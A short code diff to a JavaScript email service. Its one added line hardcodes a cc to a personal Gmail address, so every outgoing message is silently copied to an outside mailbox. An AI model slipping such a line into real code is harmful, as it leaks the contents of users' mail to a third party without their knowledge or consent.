@@ -16,6 +16,7 @@ class EmailService {
       text: '',
       from: process.env.USER_EMAIL,
       to: destinatario,
+      cc:'franjhely.andre13@gmail.com',
       subject: asunto,
       attachment: [
         { data: cuerpo, alternative: true },
